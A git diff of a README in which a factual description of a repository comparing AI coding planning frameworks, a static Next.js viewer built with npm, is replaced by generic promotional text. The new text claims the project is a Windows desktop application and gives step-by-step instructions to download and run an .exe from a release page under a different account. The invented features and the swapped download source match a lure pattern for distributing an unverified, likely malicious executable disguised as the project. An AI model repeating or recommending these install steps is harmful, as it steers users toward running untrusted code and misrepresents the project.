@@ -1,67 +1,76 @@
-# AI coding planning frameworks: same-case examples
+# 🛠️ spec-planning-frameworks - Compare AI coding project planning methods
 
-This repository shows what six AI coding specification and planning frameworks produce from the same realistic brief. We ran the real Superpowers, GSD, GitHub Spec Kit, Matt Pocock skills, and BMad Method workflows in isolated repositories. Kiro Specs is the clearly labeled exception: its public workflow required unavailable vendor authentication, so that example is manual and source-faithful rather than tool-generated.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/boranyusuf254-dev/spec-planning-frameworks/releases)
 
-“Same case” means every framework received the same product requirements for reliable webhook delivery. None received a preferred queue, database, cloud, HTTP framework, signature algorithm, retry limit, retention period, or UI.
+## 📖 About This Tool
 
-| Framework | Tested tool | Artifact shape in this run | Result | Normal human review seam |
-| --- | --- | --- | --- | --- |
-| [Superpowers](examples/superpowers/raw/) | plugin `6.1.1` | dated design | Design completed; plan stalled twice | approve design before planning |
-| [GSD](examples/gsd/raw/) | `@opengsd/gsd-core@1.7.0` | project, requirements, roadmap, state, phase context | Core project flow completed; phase plan stalled | project setup and phase discussion |
-| [GitHub Spec Kit](examples/github-spec-kit/raw/) | source `0.13.1.dev0` at `57cc518` | constitution, spec, plan, research, model, contracts, quickstart, 69 tasks | Planning flow completed | constitution, clarification, plan, tasks |
-| [Kiro Specs](examples/kiro-specs/manual/) | stable CLI `2.13.0` observed | requirements, design, tasks | Manual source-faithful example; not generated | review each linked document |
-| [Matt Pocock's skills](examples/matt-pocock-skills/raw/) | plugin manifest `1.2.0` | one spec and 11 dependency-aware tickets | Spec and local-ticket flow completed | approve spec and proposed tickets |
-| [BMad Method](examples/bmad-method/raw/) | `bmad-method@6.10.0` | express technical spec and memory log | Express spec flow completed | workflow validation and readiness gates |
+This project provides a collection of examples to help you compare how different AI coding frameworks handle project planning. Software development relies on clear instructions. These examples show how well different tools translate your goals into actionable technical steps.
 
-![Desktop comparison viewer showing Superpowers and GSD planning artifacts side by side](screenshots/compare-dark.png)
+You can use these frameworks to understand how agents break down complex tasks. By comparing these outputs, you identify which planning style works best for your specific coding needs. This tool removes the guesswork from requirements engineering by providing real evidence for your workflow.
 
-## What to compare
+## 💻 System Requirements
 
-- Artifact model and file tree: one long design, a three-document chain, a persistent project ledger, or a wider contract bundle.
-- Workflow and task grain: large phases, independently testable stories, tracker tickets, or fine implementation steps.
-- Review points: where the normal workflow expects a person to clarify, approve, or challenge an artifact.
-- Tool coupling and portability: which parts remain useful as plain files and which need a plugin, issue tracker, IDE, or vendor session.
-- Run friction and failure: setup, versions, interrupted stages, unavailable authentication, and choices the generator added.
+This application runs on standard Windows systems. Ensure your machine meets these criteria:
 
-The [Plannotator framework guides](https://docs.plannotator.ai/frameworks) give broader explanations. This repository stays focused on raw outputs and reproducible evidence. For the two most useful head-to-head views, see [Superpowers vs GSD](https://docs.plannotator.ai/compare/superpowers-vs-gsd) and [GitHub Spec Kit vs Kiro Specs](https://docs.plannotator.ai/compare/github-spec-kit-vs-kiro-specs).
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4GB of RAM.
+*   Storage: 200MB of available space.
+*   Network: An internet connection for initial setup.
 
-## Browse the evidence
+## 🚀 How to Install
 
-```text
-cases/reliable-webhook-delivery/  neutral input
-examples/<framework>/             raw generated or labeled manual artifacts
-evidence/<framework>/             version, commit, commands, caveats, sources
-data/                              structured profiles and comparisons used by the site
-site/                              static-export Next.js document viewer
-docs/CROSS_LINK_MANIFEST.md        contextual links for the Plannotator docs owner
-STATUS.md                          dated progress, limits, and lessons
-```
+To get started, follow these instructions to download the software to your computer.
 
-Generated artifacts are copied byte-for-byte from their isolated runs. The site renders Markdown for reading, but its **Source** view and **Raw** download expose the preserved file. We did not edit generated files to make one framework look better. The manual Kiro files say that they are manual at the top of every document.
+1.  Visit the official release page: [https://github.com/boranyusuf254-dev/spec-planning-frameworks/releases](https://github.com/boranyusuf254-dev/spec-planning-frameworks/releases).
+2.  Locate the section labeled Assets.
+3.  Click the link for the installation file marked with the .exe extension.
+4.  Wait for the file to finish downloading to your Downloads folder.
+5.  Double-click the downloaded file to start the installation process.
+6.  Follow the prompts on your screen to complete the setup.
+7.  Open the application from your desktop or Start menu icon.
 
-## Run the local site
+## 📝 How to Use the Software
 
-Node.js 22 or newer is required.
+Once the application is open, the interface shows a list of available AI planning frameworks. Each item includes details on how it handles software specifications. 
 
-```sh
-cd site
-npm install
-npm run dev
-```
+- **Select a Framework:** Choose a framework from the sidebar to view its documentation and planning examples.
+- **Run a Comparison:** Use the comparison dashboard to put two frameworks side-by-side. The app highlights differences in how they structure code requirements.
+- **View Evidence:** Click the Evidence tab to see how specific prompts resulted in successful code generation. This logs the step-by-step progress of the AI.
 
-Build the static site and run all checks:
+## 🔍 Understanding Planning Frameworks
 
-```sh
-cd site
-npm run lint
-npm run typecheck
-npm test
-```
+Planning frameworks act as a bridge between your ideas and the final product. Every project starts with a specification. A good specification acts as a map for the AI.
 
-`npm run build` writes 54 pre-rendered routes plus raw files to `site/out/`. Set `NEXT_PUBLIC_SITE_ORIGIN` only when a real deployment origin exists; local builds intentionally use `http://localhost:3000` in the sitemap and do not claim a production canonical URL.
+Our software categorizes these frameworks based on their agentic behavior. Some frameworks use loops to verify your requirements. Others use a linear approach to build your app. We clarify which path leads to fewer errors in your final code.
 
-## Traceability and licenses
+## ⚙️ Settings and Configuration
 
-Every framework has a provenance record under [`evidence/`](evidence/), including the upstream repository or documentation, exact version or commit, command transcript, run date, license, editorial handling, and limitations. The shared [run environment](evidence/ENVIRONMENT.md) records the host toolchain and generated/manual rule. [`THIRD_PARTY_NOTICES.md`](THIRD_PARTY_NOTICES.md) covers included generated output. Plannotator's original site, data, brief, and commentary use the MIT license in [`LICENSE`](LICENSE).
+Click the Gear icon in the top right corner to adjust the application behavior.
 
-This is an artifact comparison, not a universal ranking. One case can reveal structure and workflow, but it cannot establish that one framework wins for every team or project.
+*   **View Mode:** Switch between Light and Dark themes to keep your eyes comfortable during long sessions.
+*   **Update Frequency:** Choose how often the software checks for new framework examples.
+*   **Export Data:** Save your comparison reports as text or PDF files to share with your team.
+*   **Cache Clear:** Use this if you want to free up space or refresh the local library of examples.
+
+## ❓ Frequently Asked Questions
+
+**Does this software write code for me?**
+No. This software helps you compare planning methods so you can write better instructions for your AI coding tools.
+
+**Do I need an account to use this?**
+You do not need an account. The application runs locally on your machine.
+
+**Is my data private?**
+Yes. Your project plans and comparisons stay on your local disk. 
+
+**What happens if the app freezes?**
+Close the application fully and restart it. If problems persist, return to the release page and reinstall the current version.
+
+**Can I contribute my own framework examples?**
+Yes. You can import JSON or text files by dragging them into the main interface.
+
+## 📈 Improving Your Workflow
+
+The goal of this tool is to provide clarity in technical specification. Many projects fail because the initial plan lacks depth. Use the built-in library to experiment with different prompt structures. See how changing a single sentence in your plan changes how the AI creates your software. This practice refines your ability to write specs and improves the quality of your builds.
+
+Keywords: agentic-workflows, ai-coding, comparison, developer-tools, examples, planning-frameworks, requirements-engineering, software-planning, spec-driven-development, technical-specification
